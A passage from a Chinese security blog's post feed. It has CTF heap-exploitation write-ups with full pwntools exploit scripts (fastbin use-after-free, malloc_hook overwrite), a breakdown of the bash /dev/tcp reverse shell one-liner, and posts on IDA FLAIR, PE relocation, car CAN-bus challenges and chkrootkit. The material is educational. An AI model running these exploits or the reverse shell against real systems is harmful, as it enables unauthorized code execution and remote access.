&quot; + hex(main_arena_addr)libc_addr = main_arena_addr - main_arena_offsetprint &quot;libc_addr = &quot; + hex(libc_addr)one_gadget_addr = libc_addr + one_gadget_offsetprint &quot;one_gadget_addr = &quot; + hex(one_gadget_addr)environ_addr = libc_addr + environ_offsetprint &quot;environ_addr = &quot; + hex(environ_addr)# 计算system和/bin/sh的地址print &quot;\\ncalculating system() addr and \\&quot;/bin/sh\\&quot; addr ... ###&quot;system_addr = libc_addr + libc.symbols[&apos;system&apos;]print &quot;system_addr = &quot; + hex(system_addr)binsh_addr = libc_addr + next(libc.search(&quot;/bin/sh&quot;))print &quot;binsh_addr = &quot; + hex(binsh_addr)# getpid()# 泄露environ中的值sellbook(2)sellbook(1)add_book(&quot;a&quot;, 0, p64(0) * 3 + p64(0x21) + p64(book_addr))add_book(&quot;a&quot;, 0, p64(0))## 覆盖bookname指针add_book(&quot;a&quot;, 0, p64(0) * 2 + p64(environ_addr))readbook(0)p.recvuntil(&quot;Bookname:&quot;)stack_addr = u64(p.recvuntil(&quot;\\n&quot;)[:-1].ljust(8, &quot;\\x00&quot;))print &quot;stack_addr = &quot; + hex(stack_addr)stack_offset_40 = stack_addr - 310# getpid()# add_book(&quot;a&quot;, 0x50, &quot;test&quot;)add_book(&quot;a&quot;, 0, &quot;test1&quot;)add_book(&quot;a&quot;, 0, &quot;test2&quot;)add_book(&quot;a&quot;, 0, &quot;test3&quot;)sellbook(7)add_book(&quot;a&quot;, 0, p64(0) * 3 + p64(0x41) + p64(stack_offset_40))sellbook(8)sellbook(7)add_book(&quot;a&quot;, 0, p64(0) * 3 + p64(0x41) + p64(stack_offset_40))add_book(&quot;a&quot;, 0x30, &quot;1&quot;)print &quot;stack_addr = &quot; + hex(stack_addr)print &quot;stack_offset_40 = &quot; + hex(stack_offset_40)# getpid()# 写返回地址为rop# payload = &quot;a&quot; * 22 + p64(one_gadget_addr)payload = &quot;a&quot; * 22 + p64(pop_rdi_ret) + p64(binsh_addr) + p64(system_addr)add_book(&quot;a&quot;, 0x30, payload)p.interactive()","categories":[],"tags":[{"name":"pwn","slug":"pwn","permalink":"https://www.giantbranch.cn/tags/pwn/"},{"name":"ctf","slug":"ctf","permalink":"https://www.giantbranch.cn/tags/ctf/"}]},{"title":"CTF PWN之fastbin实例——littlenote","slug":"CTF PWN之fastbin实例——littlenote","date":"2018-12-08T00:00:00.000Z","updated":"2023-10-13T13:14:33.050Z","comments":true,"path":"2018/12/08/CTF PWN之fastbin实例——littlenote/","link":"","permalink":"https://www.giantbranch.cn/2018/12/08/CTF PWN之fastbin实例——littlenote/","excerpt":"","text":"题目：https://github.com/giantbranch/CTF_PWN/tree/master/2018/tie3/littlenote 保护方式：保护全开 123456[*] &apos;/root/ctf201812/littlenote&apos; Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled 漏洞点1：free的时候堆空间没有置0，全局note数组也没有置0 1234567891011121314151617181920unsigned __int64 freenote()&#123; unsigned int v1; // [rsp+4h] [rbp-Ch] unsigned __int64 v2; // [rsp+8h] [rbp-8h] v2 = __readfsqword(0x28u); puts(&quot;Which note do you want to delete?&quot;); _isoc99_scanf(&quot;%u&quot;, &amp;v1); if ( v1 &lt; (unsigned __int64)notenum ) &#123; if ( note[v1] ) free(note[v1]); puts(&quot;Done&quot;); &#125; else &#123; puts(&quot;Out of bound!&quot;); &#125; return __readfsqword(0x28u) ^ v2;&#125; 上面全局note数组也没有置0，就导致可以free了之后还可以show，也即uaf 1234567891011121314151617181920unsigned __int64 shownote()&#123; unsigned int v1; // [rsp+4h] [rbp-Ch] unsigned __int64 v2; // [rsp+8h] [rbp-8h] v2 = __readfsqword(0x28u); puts(&quot;Which note do you want to show?&quot;); _isoc99_scanf(&quot;%u&quot;, &amp;v1); if ( v1 &lt; (unsigned __int64)notenum ) &#123; if ( note[v1] ) puts((const char *)note[v1]); puts(&quot;Done&quot;); &#125; else &#123; puts(&quot;Out of bound!&quot;); &#125; return __readfsqword(0x28u) ^ v2;&#125; 还有一个是add的代码，那个N的分支好像没什么用 123456789101112131415161718192021222324252627unsigned __int64 addnote()&#123; __int64 v0; // rbx __int64 v1; // rbx char buf; // [rsp+0h] [rbp-20h] unsigned __int64 v4; // [rsp+8h] [rbp-18h] v4 = __readfsqword(0x28u); if ( (unsigned __int64)notenum &gt; 0xF ) puts(&quot;FULL&quot;); v0 = notenum; note[v0] = malloc(0x60uLL); puts(&quot;Enter your note&quot;); read(0, note[notenum], 0x60uLL); puts(&quot;Want to keep your note?&quot;); read(0, &amp;buf, 7uLL); if ( buf == &apos;N&apos; ) &#123; puts(&quot;OK,I will leave a backup note for you&quot;); free(note[notenum]); v1 = notenum; note[v1] = malloc(0x20uLL); &#125; ++notenum; puts(&quot;Done&quot;); return __readfsqword(0x28u) ^ v4;&#125; 要点 1、任意地址写：fastbin 的uaf2、泄露堆地址：fastbin的free3、泄露libc地址：非fastbin的free，如smallbin4、堆溢出：fastbin的uaf可以在当前堆块伪造同样大小的size之后就可以溢出下一个堆块的size了，从而构造smallbin大小，5、free smallbin大小的注意下一块堆块对应的位置的size大小 exp 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495#!/usr/bin/env python# -*- coding: utf-8 -*-# @Date : 2018-12-07 21:54:30# @Author : giantbranch (giantbranch@gmail.com)# @Link : http://www.giantbranch.cn/# @tags : from pwn import *# context.log_level = &quot;debug&quot;p = process(&quot;./littlenote&quot;)# local libcmain_arena_offset = 0x39db00one_gadget_offset = 0x40c3fdef add(note): p.recvuntil(&quot;Your choice:\\n&quot;) p.sendline(&quot;1&quot;) p.recvuntil(&quot;Enter your note\\n&quot;) p.send(note) p.recvuntil(&quot;Want to keep your note?\\n&quot;) p.sendline(&quot;Y&quot;)def show(index): p.recvuntil(&quot;Your choice:\\n&quot;) p.sendline(&quot;2&quot;) p.recvuntil(&quot;Which note do you want to show?\\n&quot;) p.sendline(str(index))def delete(index): p.recvuntil(&quot;Your choice:\\n&quot;) p.sendline(&quot;3&quot;) p.recvuntil(&quot;Which note do you want to delete?\\n&quot;) p.sendline(str(index))def getpid(): print proc.pidof(p)[0] pause()# lead heapadd(&quot;A&quot; * 0x10)add(&quot;B&quot; * 0x8 + p64(0x71))add(&quot;C&quot; * 0x10)add(p64(0) * 3 + p64(0x51))delete(1)delete(0)delete(1)show(0)heap_addr = u64(p.recvuntil(&quot;\\n&quot;)[:-1].ljust(8, &quot;\\x00&quot;))print &quot;heap_addr = &quot; + hex(heap_addr)# lead libcadd(p64(heap_addr + 0x10)) # fake fdadd(&quot;D&quot; * 8) # offset 0x00add(p64(0)) # offset 0x70add(&quot;F&quot; * 0x50 + p64(0) + p64(0x91)) # modify the sizedelete(2) # free the 0x91 heapshow(2)main_arena_near = u64(p.recvuntil(&quot;\\n&quot;)[:-1].ljust(8, &quot;\\x00&quot;))# print &quot;main_arena_near = &quot; + hex(main_arena_near)main_arena_addr = main_arena_near - 0x58print &quot;main_arena_addr = &quot; + hex(main_arena_addr)libc_addr = main_arena_addr - main_arena_offsetprint &quot;libc_addr = &quot; + hex(libc_addr)one_gadget_addr = libc_addr + one_gadget_offsetprint &quot;one_gadget_addr = &quot; + hex(one_gadget_addr)# write malloc_hookadd(&quot;1&quot;) # 8add(&quot;2&quot;) # 9add(&quot;3&quot;) # 10delete(8)delete(9)delete(8)# x /10gx (long long)(&amp;main_arena) - 51fake_addr = main_arena_addr - 51add(p64(fake_addr)) # 11add(&quot;UUUUUUUU&quot;) #12add(&quot;OOOOOOOO&quot;) #13add(&quot;A&quot; * 0x13 + p64(one_gadget_addr)) #14# getpid()# getshellprint &quot;get shell now&quot;p.recvuntil(&quot;Your choice:\\n&quot;)p.sendline(&quot;1&quot;)# add(&quot;G&quot; * 8)# delete(0)# getpid()# p.sendline()p.interactive()","categories":[],"tags":[{"name":"pwn","slug":"pwn","permalink":"https://www.giantbranch.cn/tags/pwn/"},{"name":"ctf","slug":"ctf","permalink":"https://www.giantbranch.cn/tags/ctf/"},{"name":"fastbin","slug":"fastbin","permalink":"https://www.giantbranch.cn/tags/fastbin/"}]},{"title":"从ida的flair工具去理解它是怎么识别出静态链接程序中的库函数的","slug":"从ida的flair工具去理解它是怎么识别出静态链接程序中的库函数的","date":"2018-12-01T00:00:00.000Z","updated":"2023-10-13T13:14:33.130Z","comments":true,"path":"2018/12/01/从ida的flair工具去理解它是怎么识别出静态链接程序中的库函数的/","link":"","permalink":"https://www.giantbranch.cn/2018/12/01/从ida的flair工具去理解它是怎么识别出静态链接程序中的库函数的/","excerpt":"","text":"实验目的简单理解ida如何识别静态链接程序中的库函数 实验环境 ida7.0flair68vs 2017 实验过程比如我使用vs2017用MFC编写一段代码，点击按钮，弹窗的（因为直接MessageBox还想并不能生成静态编译的MessageBox） 添加按钮，之后双击按钮，假如代码即可（当然直接一个空工程也行，主要是看下ida使用了那些sig文件） 12345void CMFCApplication1Dlg::OnBnClickedButton1()&#123; // TODO: 在此添加控件通知处理程序代码 MessageBox(TEXT(&quot;giantbranch&quot;), TEXT(&quot;giantbranch&quot;), 0);&#125; 我们使用静态编译 项目属性—常规—MFC的使用—在静态库中使用MFC 我们用ida打开，可以看到很多函数都识别出来了，我们可以通过shift+f5看看ida使用了那些签名文件，我们可以看到mfc的vc32mfc.sig 也就是ida的sig/pc目录下vc32mfc.sig 那么这个sig函数是如何生成的呢 比如我们以nafxcwd.lib这个文件为例（这是也是mfc程序需要链接的一个文件，假如你装了vs，可以通过everything搜索这个文件），执行下面的命令，即可生成nafxcwd.pat 1pcf.exe nafxcwd.lib 我们打开pat文件，可以看到其实就是一些机器码序列，不确定的就用.来说明 我们用ida打开nafxcwd.lib中的第一个obj，发现并没有什么代码，但是也可以发现一点东西 可以看到了吧，两个.代表一个字节，说明是不确定的 再看一个例子 最后通过sigmake nafxcwd.pat nafxcw.sig即可生成sig文件但是需要在nafxcw.exc解决冲突再执行，因为有些函数特征一样的。。。） 懒得解决冲突了，要在前面添加加号或者减号什么的。。。 ctf的静态链接我们可以尝试file -&gt;load sig文件尝试去识别 这有个repo https://github.com/push0ebp/sig-database referencehttps://lichao890427.github.io/2015/01/15/about-ida-flirt/","categories":[],"tags":[{"name":"静态链接库函数识别","slug":"静态链接库函数识别","permalink":"https://www.giantbranch.cn/tags/静态链接库函数识别/"}]},{"title":"理解别人写的简单的重定位程序","slug":"理解别人写的简单的重定位程序","date":"2018-11-26T00:00:00.000Z","updated":"2023-10-13T13:14:33.134Z","comments":true,"path":"2018/11/26/理解别人写的简单的重定位程序/","link":"","permalink":"https://www.giantbranch.cn/2018/11/26/理解别人写的简单的重定位程序/","excerpt":"","text":"看了下看雪的一篇文章，加深下对重定位的理解，其实这是一个程序 https://bbs.pediy.com/thread-76638.htm 这个程序需要用户输入的是加载基址，还有文件的路径 开始首先通过MZ头，还有e_lfanew偏移是否是PE\\x00\\x00 来判断这是否是一个PE文件 123456789101112131415BOOL VerifyPE( PVOID pFile ) &#123; PIMAGE_DOS_HEADER pDosHeader; PIMAGE_NT_HEADERS pNtHeader; pDosHeader = (PIMAGE_DOS_HEADER)pFile; if ( pDosHeader-&gt;e_magic != 0x5A4D ) // compare with &apos;MZ&apos; return FALSE; pNtHeader = (PIMAGE_NT_HEADERS)((PCHAR)pFile + pDosHeader-&gt;e_lfanew); // e_lfanew + 0x3c if ( pNtHeader-&gt;Signature != 0x00004550 ) // compare with &apos;PE\\0\\0&apos; return FALSE; return TRUE; &#125; 重定位计算镜像基址与真正加载基址的差值 12345pDosHeader = (PIMAGE_DOS_HEADER)pFile; pNtHeader = (PIMAGE_NT_HEADERS)((PCHAR)pFile + pDosHeader-&gt;e_lfanew); // e_lfanew + 0x3c dwImageBase = pNtHeader-&gt;OptionalHeader.ImageBase; dwDiffer = dwImageBase - BaseAddr; // pay attention to the order 获取重定位表RVA，并计算出File Offset 12345 // Get reloc table RVA PIMAGE_DATA_DIRECTORY pRelocTable = (PIMAGE_DATA_DIRECTORY)pNtHeader-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress; // Get reloc table File Offset pRelocBlock = (PIMAGE_RELOCATION)( (PCHAR)pFile + RvaToFileOff( pFile, (DWORD)pRelocTable ) ); // the pRelocTable is file offset? 之后根据重定位表循环计算真正的地址，具体如下 1、一次获取一条记录，获取其RVA，算出File Offset2、通过与pRelocAddr相加得到储存原始地址的地方（即要修正的地址）3、将这个要修正的地址减去之前算出来的基址的差别即可4、最后将结果写回文件即可 12345678910111213141516171819pRelocAddr = pRelocBlock-&gt;VirtualAddress + (*pType &amp; 0x0fff); // pRelocAddr += dwImageBase; // Get reloc address&apos;s File Offset pRelocAddr = RvaToFileOff( pFile, pRelocAddr ); // DWORD test = pRelocAddr; // Go to the Buffer offset pRelocAddr += (DWORD)pFile; // Get the reloc address dwRelocAddr = *(PDWORD)pRelocAddr; // Calculate the new address dwRelocAddr -= dwDiffer; // Copy to the file *(PDWORD)pRelocAddr = dwRelocAddr;","categories":[],"tags":[{"name":"重定位","slug":"重定位","permalink":"https://www.giantbranch.cn/tags/重定位/"}]},{"title":"深入bash反弹shell的那条命令","slug":"深入bash反弹shell的那条命令","date":"2018-11-19T00:00:00.000Z","updated":"2023-10-13T13:14:33.134Z","comments":true,"path":"2018/11/19/深入bash反弹shell的那条命令/","link":"","permalink":"https://www.giantbranch.cn/2018/11/19/深入bash反弹shell的那条命令/","excerpt":"","text":"想年后回广东，最近某次面试被虐了，说我研究东西不够深入，哎写点东西吧，虽然面的是二进制，但是电话面试面了近两小时，什么都可能聊到啦，所以这个是面试的一个点 其实以前我会斟酌每个细节，比如之前写的《通过sqli-labs学习sql注入》系列 https://blog.csdn.net/u012763794/column/info/15022 基本上除了数据库底层的东西，都会弄懂了 仔细回头看看，确实最近很少去深入研究某个东西了，是我做的东西太多了吗，涉及面太广了吗，还是最近懒惰了，还是我以前的知识忘了或者研究得不够深入，可能以上原因都有，但是研究得不够深入肯定是主因，因为一旦一个东西研究得非常透彻，你很难忘记，再怎么网，也能说出点什么 对于bash反弹shell这条命令,相信很多同学都很熟悉了： 1/bin/bash -i &gt;&amp; /dev/tcp/192.168.21.1/XXX 0&gt;&amp;1 但是这里面的每个细节是否都清楚了，这可就不一定了 关于-i12root@instance-2:~# man bash | grep -E &quot;\\-i&quot; -i If the -i option is present, the shell is interactive. 首先-i是交互的模式，这个好像是必须的，但是真的吗，其实不用-i也是可以的 因为本来bash就是交互式的吧 关于&gt;&amp;12345678910111213141516171819202122232425262728293031root@kali:~# man bash | grep &quot;Redirecting Standard Output and Standard Error&quot; -A 30 Redirecting Standard Output and Standard Error This construct allows both the standard output (file descriptor 1) and the standard error output (file descriptor 2) to be redirected to the file whose name is the expansion of word. There are two formats for redirecting standard output and standard error: &amp;&gt;word and &gt;&amp;word Of the two forms, the first is preferred. This is semantically equivalent to &gt;word 2&gt;&amp;1 When using the second form, word may not expand to a number or -. If it does, other redirection operators apply (see Duplicating File Descriptors below) for compatibility reasons. Appending Standard Output and Standard Error This construct allows both the standard output (file descriptor 1) and the standard error output (file descriptor 2) to be appended to the file whose name is the expansion of word. The format for appending standard output and standard error is: &amp;&gt;&gt;word This is semantically equivalent to &gt;&gt;word 2&gt;&amp;1 (see Duplicating File Descriptors below). 看bash的文档，可以看到，这个是将标准输出和标准错误都重定向了 跟 &gt;word 2&gt;&amp;1的效果是一致的 当然我们用&amp;&gt;也是可以的 关于0&gt;&amp;10&gt;1是将标准输入重定向到文件名为1的文件，不存在就创建 所以为了区别，那就在1前面加个&amp;来表示标准输出 0&gt;&amp;1 关于 /dev/tcp/XXX.XXX.XXX.XXX/XXX我们知道linux一切皆文件，但是其实这个文件肯定是不存在的 第一个是ipv4的ip这么多，端口是1-65535，这是多么庞大的一个组合 那么这是可能只是bash的特性，我们可以从man文档中看到 1234567root@instance-2:~# man bash | grep &quot;/dev/tcp&quot; -A 5 /dev/tcp/host/port If host is a valid hostname or Internet address, and port is an integer port number or service name, bash attempts to open the corresponding TCP socket. /dev/udp/host/port If host is a valid hostname or Internet address, and port is an integer port number or service name, bash attempts to open the corresponding UDP socket. 那么这个是在主机名、ip地址以及端口有效的情况，会打开一个TCP的套接字，连接对应主机的对应端口 总结通过一场好的面试确实可以学到很多东西，通过跟自己更牛的人交流，知道自己缺的是什么，差距在哪里","categories":[],"tags":[{"name":"bash反弹shell","slug":"bash反弹shell","permalink":"https://www.giantbranch.cn/tags/bash反弹shell/"}]},{"title":"车联网安全竞赛，汽车攻防大赛的比赛简介及攻略","slug":"车联网安全竞赛，汽车攻防大赛的比赛简介及攻略","date":"2018-11-09T00:00:00.000Z","updated":"2023-10-13T13:14:33.134Z","comments":true,"path":"2018/11/09/车联网安全竞赛，汽车攻防大赛的比赛简介及攻略/","link":"","permalink":"https://www.giantbranch.cn/2018/11/09/车联网安全竞赛，汽车攻防大赛的比赛简介及攻略/","excerpt":"","text":"[toc] 注：以下内容只针对汽车协议破解什么的比赛内容 简介车联网，汽车攻防大赛这些比赛是刚起步，刚开始的比赛肯定不会太难，类似于CTF比赛的时候很多都是非常简单的Web题，misc题等 以下内容根据我的师弟参加的两场汽车攻防大赛，还有我参加的一场护网杯的车辆网的分赛 比赛过程比赛前护网杯主办方比赛准备：汽车当然会开到现场，主办方会将一条线插到汽车的插口，之后那条线会拉到室内，那条线是一分多的，所以多个队伍可以接入，一个队伍只能一个人接入 我们使用的是下面的转接线将其转化为usb（这个转接线主办方提供） 我们直接将这个接到上面那个线上，usb口的话接我们的电脑就好了 最后我们安装主办法提供的软件，根据主办方之前的培训操作软件进行监听就好了 师弟的比赛这个他们直接使用的是主办方的云平台，是浏览器访问的，界面跟护网杯提供的软件的界面差不多的 比赛如何得分指挥员会统一指挥四架车辆进行打左转向灯，远光灯，开关门，调节空调等操作，我们可以通过屏幕可以看到车的操作（主办方用摄像机实时投到室内的大屏幕上） 每一次的操作会重复两遍，每次两分钟（比如打左转向灯，会在两分钟内不断地开左转向灯，关左转向灯） 之后我们在类似在下面的软件中找出对应的数据就行了，具体包括 信号的id，还有实现这一操作的8字节数据 注意上面的不是比赛软件，但是类似，当然上面的数据部分会不断变化的 具体的软件是下面那样的，赛前培训的图，比较模糊 注意点 那些快速变化的数据，100%不是我们要找的数据 那些灯的操作很可能都是同一个id的 只有开关操作的（开关灯，开关门），基本可能只改变了1个byte，所以关注那些不变的数据，当汽车打开转向灯，那个数据的1个byte变化了，那就基本确定了，通过接下来的重复操作，再次确认id和数据 而那些调节量，比如空调温度调节，肯定会改变几个byte，这个就比较难了，但也是一开始肯定是不变的，之后调节会变","categories":[],"tags":[{"name":"车联网安全","slug":"车联网安全","permalink":"https://www.giantbranch.cn/tags/车联网安全/"},{"name":"汽车攻防","slug":"汽车攻防","permalink":"https://www.giantbranch.cn/tags/汽车攻防/"},{"name":"汽车黑客","slug":"汽车黑客","permalink":"https://www.giantbranch.cn/tags/汽车黑客/"}]},{"title":"CTF PWN专用虚拟机","slug":"CTF PWN专用虚拟机","date":"2018-11-07T00:00:00.000Z","updated":"2023-10-13T13:14:33.050Z","comments":true,"path":"2018/11/07/CTF PWN专用虚拟机/","link":"","permalink":"https://www.giantbranch.cn/2018/11/07/CTF PWN专用虚拟机/","excerpt":"","text":"前言虽然之前写了个 —— CTF PWN 做题环境一键搭建脚本，欢迎star和使用 https://github.com/giantbranch/pwn-env-init 但是在使用过程中可能会出现或多或少的问题需要自己解决，所以干脆直接搞个配置好的Ubuntu 16.04 简介系统为desktop版，使用上面的CTF PWN 做题环境一键搭建脚本进行配置的环境 主要配置了以下东西： 为64位系统提供32位运行环境支撑 下载了libc6的源码，方便源码调试（ 可看这https://blog.csdn.net/u012763794/article/details/78457973 ） 给gdb装上pwndbg和peda插件 安装pwntools 安装one_gadget 下载libc-database 下载链接：https://pan.baidu.com/s/1Ia8NPcXy414QOaiH14T3sQ提取码：kypa复制这段内容后打开百度网盘手机App，操作更方便哦 账号密码： giantbranch:giantbranch 截图","categories":[],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://www.giantbranch.cn/tags/CTF/"},{"name":"PWN","slug":"PWN","permalink":"https://www.giantbranch.cn/tags/PWN/"},{"name":"虚拟机","slug":"虚拟机","permalink":"https://www.giantbranch.cn/tags/虚拟机/"}]},{"title":"通过chkrootkit学习如何在linux下检测RootKit","slug":"通过chkrootkit学习如何在linux下检测RootKit","date":"2018-10-09T00:00:00.000Z","updated":"2023-10-13T13:14:33.134Z","comments":true,"path":"2018/10/09/通过chkrootkit学习如何在linux下检测RootKit/","link":"","permalink":"https://www.giantbranch.cn/2018/10/09/通过chkrootkit学习如何在linux下检测RootKit/","excerpt":"","text":"Rootkit是一种特殊的恶意软件，它的功能是在安装目标上隐藏自身及指定的文件、进程和网络链接等信息，比较多见到的是Rootkit一般都和木马、后门等其他恶意程序结合使用。Rootkit一词更多地是指被作为驱动程序，加载到操作系统内核中的恶意软件。 chkrootkit简介chkrootkit是一个linux下检RootKit的脚本，在某些检测中会调用当前目录的检测程序 官网：http://www.chkrootkit.org/ 下载源码：ftp://ftp.pangeia.com.br/pub/seg/pac/chkrootkit.tar.gz 解压后执行 make 命令，就可以使用了 一般直接运行，一旦有INFECTED，说明可能被植入了RootKit 1./chkrootkit | grep INFECTED 总体流程首先删除别名，确保接下来的一些操作不会用了被RootKit改变了的别名 123456### workaround for some Bourne shell implementationsunalias login &gt; /dev/null 2&gt;&amp;1unalias ls &gt; /dev/null 2&gt;&amp;1unalias netstat &gt; /dev/null 2&gt;&amp;1unalias ps &gt; /dev/null 2&gt;&amp;1unalias dirname &gt; /dev/null 2&gt;&amp;1 一开始会检测一些必要的命令是否可用，可执行，因为检测基于这些命令 12345678910111213141516cmdlist=&quot;awkcutechoegrepfindheadidlsnetstatpssedsshstringsuname&quot; 接下来就是检测ps的参数ax好不好使，好使就使用ax，不好使就用-fe 123456# Check if ps command is okif $&#123;ps&#125; ax &gt;/dev/null 2&gt;&amp;1 ; then ps_cmd=&quot;ax&quot;else ps_cmd=&quot;-fe&quot;fi 当然还需检测你是否是root，就根据你的id号是否为0 1234if [ `$&#123;id&#125; | $&#123;cut&#125; -d= -f2 | $&#123;cut&#125; -d\\( -f1` -ne 0 ]; then echo &quot;$0 need root privileges&quot; exit 1fi 接下来就是默认执行所有测试，当然你也可以指定测试的命令 123456789101112131415161718if [ $# -gt 0 ]then ### perform only tests supplied as arguments for arg in $* do ### check if is a valid test name if echo &quot;$&#123;TROJAN&#125; $&#123;TOOLS&#125;&quot;| \\ $&#123;egrep&#125; -v &quot;$&#123;L_REGEXP&#125;$arg$&#123;R_REGEXP&#125;&quot; &gt; /dev/null 2&gt;&amp;1 then echo &gt;&amp;2 &quot;$0: \\`$arg&apos;: not a known test&quot; exit 1 fi done LIST=$*else ### this is the default: perform all tests LIST=&quot;$&#123;TROJAN&#125; $&#123;TOOLS&#125;&quot;fi 接下来只是对是否开启调试模式，用户是否指定了要检测的根目录进行处理 123456789101112131415161718192021if [ &quot;$&#123;DEBUG&#125;&quot; = &quot;t&quot; ]; then set -xfiif [ &quot;$&#123;ROOTDIR&#125;&quot; != &quot;/&quot; ]; then ### remove trailing `/&apos; ROOTDIR=`echo $&#123;ROOTDIR&#125; | $&#123;sed&#125; -e &apos;s/\\/*$//g&apos;` for dir in $&#123;pth&#125; do if echo $&#123;dir&#125; | $&#123;egrep&#125; &apos;^/&apos; &gt; /dev/null 2&gt;&amp;1 then newpth=&quot;$&#123;newpth&#125; $&#123;ROOTDIR&#125;$&#123;dir&#125;&quot; else newpth=&quot;$&#123;newpth&#125; $&#123;ROOTDIR&#125;/$&#123;dir&#125;&quot; fi done pth=$&#123;newpth&#125; ROOTDIR=&quot;$&#123;ROOTDIR&#125;/&quot;fi 最后便是循环调用各个check函数进行处理了 1234567891011121314151617181920212223242526272829303132333435363738for cmd in $&#123;LIST&#125;do if echo &quot;$&#123;TROJAN&#125;&quot; | \\ $&#123;egrep&#125; &quot;$&#123;L_REGEXP&#125;$cmd$&#123;R_REGEXP&#125;&quot; &gt; /dev/null 2&gt;&amp;1 then if [ &quot;$&#123;EXPERT&#125;&quot; != &quot;t&quot; -a &quot;$&#123;QUIET&#125;&quot; != &quot;t&quot; ]; then printn &quot;Checking \\`$&#123;cmd&#125;&apos;... &quot; fi chk_$&#123;cmd&#125; STATUS=$? ### quiet mode if [ &quot;$&#123;QUIET&#125;&quot; = &quot;t&quot; ]; then ### show only INFECTED status if [ $&#123;STATUS&#125; -eq 0 ]; then echo &quot;Checking \\`$&#123;cmd&#125;&apos;... INFECTED&quot; fi continue fi case $STATUS in 0) echo &quot;INFECTED&quot;;; 1) echo &quot;not infected&quot;;; 2) echo &quot;not tested&quot;;; 3) echo &quot;not found&quot;;; 4) echo &quot;infected but disabled&quot;;; 5) ;; ### expert mode esac else ### external tool if [ &quot;$&#123;EXPERT&#125;&quot; != &quot;t&quot; -a &quot;$&#123;QUIET&#125;&quot; != &quot;t&quot; ]; then printn &quot;Checking \\`$cmd&apos;... &quot; fi $&#123;cmd&#125; fidone 那么接下来每个check方法到底是怎么检测的呢？接下来 检测方法通过分析脚本，总结出检测方法如下： 搜索通用的ROOTKIT特征的字符串 对某种特定的rootkits，或者命令的特殊的感染特征进行检测 对某种特定的rootkits的生成的特定文件的检测 对程序的SUID位的设置进行检测 对ldsopreload的检测 查找可疑的log文件 查找可疑的php文件 检测.history文件 检测有无程序监听了一些可疑的端口 检测Linux可加载内核模块 检测有无隐藏进程 检测目录的软链接异常 检测网络接口的异常 检测用户的登录日志 检测上一次登录 检测可疑的没有tty记录的进程 下面对上面这些方法结合脚本代码进行简单说明 搜索通用的ROOTKIT特征的字符串搜索的是下面的比较通用的ROOTKIT字符串 12# Many trojaned commands have this labelGENERIC_ROOTKIT_LABEL=&quot;^/bin/.*sh$|bash|elite$|vejeta|\\.ark|iroffer&quot; 可以看到前两个都是shell相关的，相关的示例代码如下： 123456789101112131415161718192021222324252627chk_chfn () &#123; STATUS=$&#123;NOT_INFECTED&#125; CMD=`loc chfn chfn $pth` [ $&#123;?&#125; -ne 0 ] &amp;&amp; return $&#123;NOT_FOUND&#125; if [ &quot;$&#123;EXPERT&#125;&quot; = &quot;t&quot; ]; then expertmode_output &quot;$&#123;strings&#125; -a $&#123;CMD&#125;&quot; return 5 fi case &quot;$&#123;SYSTEM&#125;&quot; in Linux) if $&#123;strings&#125; -a $&#123;CMD&#125; | $&#123;egrep&#125; &quot;$&#123;GENERIC_ROOTKIT_LABEL&#125;&quot; \\ &gt;/dev/null 2&gt;&amp;1 then STATUS=$&#123;INFECTED&#125; fi;; FreeBSD) [ `echo $V | $&#123;awk&#125; &apos;&#123; if ( $1 &gt;= 5.0) print 1; else print 0 &#125;&apos;` -eq 1 ] &amp;&amp; n=1 || n=2 if [ `$&#123;strings&#125; -a $&#123;CMD&#125; | \\ $&#123;egrep&#125; -c &quot;$&#123;GENERIC_ROOTKIT_LABEL&#125;&quot;` -ne $n ] then STATUS=$&#123;INFECTED&#125; fi;; esac return $&#123;STATUS&#125;&#125; 程序针对Linux和FreeBSD系统分开处理，都是通过strings获取二进制程序中的字符串，再使用egrep命令去正则匹配，匹配成功就将返回值STATUS设置为INFECTED这个常量（这个在文件开头处定义了） 对某种特定的rootkits，或者命令的特殊的感染特征进行检测比如这个amd命令的某个感染特征 1234567891011121314151617chk_amd () &#123; STATUS=$&#123;NOT_INFECTED&#125; AMD_INFECTED_LABEL=&quot;blah&quot; CMD=`loc amd amd $pth` if [ ! -x &quot;$&#123;CMD&#125;&quot; ]; then return $&#123;NOT_FOUND&#125; fi if [ &quot;$&#123;EXPERT&#125;&quot; = &quot;t&quot; ]; then expertmode_output &quot;$&#123;strings&#125; -a $&#123;CMD&#125;&quot; return 5 fi if $&#123;strings&#125; -a $&#123;CMD&#125; | $&#123;egrep&#125; &quot;$&#123;AMD_INFECTED_LABEL&#125;&quot; &gt;/dev/null 2&gt;&amp;1 then STATUS=$&#123;INFECTED&#125; fi return $&#123;STATUS&#125;&#125; 下面这个检测crontab的nobody用户，并且定时任务中有数字的， 可能是Lupper.Worm当然还是有CRONTAB_I_L这个特殊的检测 12345678910111213141516171819202122232425chk_crontab () &#123; STATUS=$&#123;NOT_INFECTED&#125; CRONTAB_I_L=&quot;crontab.*666&quot; CMD=`loc crontab crontab $pth` if [ ! -r $&#123;CMD&#125; ] then return $&#123;NOT_FOUND&#125; fi if [ &quot;$&#123;EXPERT&#125;&quot; = &quot;t&quot; ]; then expertmode_output &quot;$&#123;CMD&#125; -l -u nobody&quot; return 5 fi # slackware&apos;s crontab have a bug if ( $&#123;CMD&#125; -l -u nobody | $egrep [0-9] ) &gt;/dev/null 2&gt;&amp;1 ; then $&#123;echo&#125; &quot;Warning: crontab for nobody found, possible Lupper.Worm... &quot; if $&#123;CMD&#125; -l -u nobody 2&gt;/dev/null | $&#123;egrep&#125; $CRONTAB_I_L &gt;/dev/null 2&gt;&amp;1 then STATUS=$&#123;INFECTED&#125; fi fi return $&#123;STATUS&#125;&#125; 对Ramen Worm进行特征匹配 1234if $&#123;egrep&#125; &quot;^asp&quot; $&#123;ROOTDIR&#125;etc/inetd.conf &gt;/dev/null 2&gt;&amp;1; then echo &quot;Warning: Possible Ramen Worm installed in inetd.conf&quot; STATUS=$&#123;INFECTED&#125;fi 对某种特定的rootkits生成的特定文件的检测如下面的HiDrootkit和t0rn 123456789101112131415161718192021### HiDrootkitif [ &quot;$&#123;QUIET&#125;&quot; != &quot;t&quot; ]; then printn \\ &quot;Searching for HiDrootkit&apos;s default dir... &quot;; fiif [ -d 